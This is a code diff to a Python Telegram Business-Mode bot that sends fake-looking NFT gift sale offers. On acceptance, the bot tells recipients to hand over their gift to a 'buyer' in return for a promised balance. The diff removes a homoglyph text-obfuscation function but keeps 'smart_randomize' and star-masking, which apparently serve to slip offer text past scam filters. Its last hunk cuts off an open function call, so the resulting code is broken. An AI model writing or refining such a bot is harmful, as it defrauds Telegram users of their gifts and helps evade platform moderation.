@@ -136,74 +136,6 @@ def smart_randomize(text: str) -> str:
         i += 1
     return "".join(result)
 
-HOMOGLYPH_CYR = {
-    "а": "a", "е": "e", "о": "o", "с": "c", "р": "p", "х": "x", "у": "y",
-}
-
-HOMOGLYPH_CYR_CAP = {
-    "А": "Α", "В": "Β", "Е": "Ε", "К": "Κ", "М": "Μ", "Н": "Η",
-    "О": "Ο", "Р": "Ρ", "С": "Ϲ", "Т": "Τ", "У": "Υ", "Х": "Χ",
-}
-
-HOMOGLYPH_LAT_TO_CYR = {
-    "a": "а", "e": "е", "o": "о", "p": "р", "c": "с", "x": "х", "y": "у",
-}
-
-HOMOGLYPH_LAT_CAP = {
-    "A": "Α", "B": "Β", "E": "Ε", "H": "Η", "I": "Ι", "K": "Κ",
-    "M": "Μ", "N": "Ν", "O": "Ο", "P": "Ρ", "T": "Τ", "X": "Χ",
-    "Y": "Υ", "Z": "Ζ", "C": "Ϲ",
-}
-
-def randomize_all(text: str, probability: float = 1.0) -> str:
-    result = []
-    i = 0
-    n = len(text)
-    while i < n:
-        if text[i] == "<":
-            end = text.find(">", i)
-            if end != -1:
-                result.append(text[i:end + 1])
-                i = end + 1
-                continue
-        if text[i:i+7].lower() == "http://" or text[i:i+8].lower() == "https://":
-            end = i
-            while end < n and text[end] not in " \n\t<>":
-                end += 1
-            result.append(text[i:end])
-            i = end
-            continue
-        if text[i] == "@":
-            end = i + 1
-            while end < n and (text[end].isalnum() or text[end] == "_"):
-                end += 1
-            result.append(text[i:end])
-            i = end
-            continue
-        if text[i:i+2] == "@@" and i + 2 < n:
-            end = text.find("@@", i + 2)
-            if end != -1:
-                result.append(text[i:end + 2])
-                i = end + 2
-                continue
-
-        char = text[i]
-        if random.random() < probability:
-            if char in HOMOGLYPH_CYR_CAP:
-                result.append(HOMOGLYPH_CYR_CAP[char])
-            elif char in HOMOGLYPH_CYR:
-                result.append(HOMOGLYPH_CYR[char])
-            elif char in HOMOGLYPH_LAT_CAP:
-                result.append(HOMOGLYPH_LAT_CAP[char])
-            elif char in HOMOGLYPH_LAT_TO_CYR:
-                result.append(HOMOGLYPH_LAT_TO_CYR[char])
-            else:
-                result.append(char)
-        else:
-            result.append(char)
-        i += 1
-    return "".join(result)
-
 def gift_emoji() -> str:
     return f'<tg-emoji emoji-id="{GIFT_EMOJI_ID}">🎁</tg-emoji>'
 
@@ -262,7 +194,7 @@ def get_lang(code: str) -> str:
     if not code:
         return "ru"
     c = code.strip().lower()
-    if c == "en":
+    if c in ("en", "us"):
         return "us"
     return c if c in TEXTS else "ru"
 
@@ -368,14 +300,9 @@ async def cmd_rep_business(message: types.Message):
         nft_link="@@NFT@@",
     )
 
-    if lang in ("ru", "ua"):
-        offer_text_rand = smart_randomize(offer_text_raw)
-        nft_name_rand = nft_full_name
-        expires_text = smart_randomize(t['offer_expires'])
-    else:
-        offer_text_rand = randomize_all(offer_text_raw, probability=1.0)
-        nft_name_rand = randomize_all(nft_full_name, probability=1.0)
-        expires_text = randomize_all(t['offer_expires'], probability=1.0)
+    offer_text_rand = smart_randomize(offer_text_raw) if lang in ("ru", "ua") else offer_text_raw
+    nft_name_rand = nft_full_name
+    expires_text = smart_randomize(t['offer_expires']) if lang in ("ru", "ua") else t['offer_expires']
 
     nft_link = f'<a href="{nft_url}">{nft_name_rand}</a>'
 
@@ -424,7 +351,7 @@ async def process_accept(callback: CallbackQuery):
     offer["status"] = "accepted"
     lang = offer["lang"]
     currency_text = mask_stars(offer['currency'])
-    nft_name_rand = offer['nft_name'] if lang in ("ru", "ua") else randomize_all(offer['nft_name'], probability=1.0)
+    nft_name_rand = offer['nft_name']
 
     alert_texts = {
         "ru": f"Предложение о продаже {offer['nft_name']} успешно принято.\n\nПередайте подарок покупателю для зачисления {offer['amount']} {currency_text} на ваш баланс.",
@@ -485,7 +412,7 @@ async def process_decline(callback: CallbackQuery):
     lang = offer["lang"]
     t = TEXTS[lang]
 
-    declined_rand = smart_randomize(t['declined']) if lang in ("ru", "ua") else randomize_all(t['declined'], probability=1.0)
+    declined_rand = smart_randomize(t['declined']) if lang in ("ru", "ua") else t['declined']
     text = f"{cross_emoji()} {declined_rand}"
 
     try:
@@ -495,24 +422,3 @@ async def process_decline(callback: CallbackQuery):
             business_connection_id=callback.message.business_connection_id,
             text=text,
             link_preview_options=LinkPreviewOptions(is_disabled=True),
-            parse_mode="HTML"
-        )
-    except Exception as e:
-        print(f"[EDIT ERROR] {e}")
-
-    await callback.answer()
-
-@dp.callback_query(F.data.startswith("confirm_"))
-async def process_confirm(callback: CallbackQuery):
-    await callback.answer()
-
-@dp.business_message()
-async def debug_business(message: types.Message):
-    print(f"[BUSINESS DEBUG] {message.text!r} | conn_id={message.business_connection_id}")
-
-async def main():
-    print("Бот запущен (Business Mode)...")
-    await dp.start_polling(bot)
-
-if __name__ == "__main__":
-    asyncio.run(main())
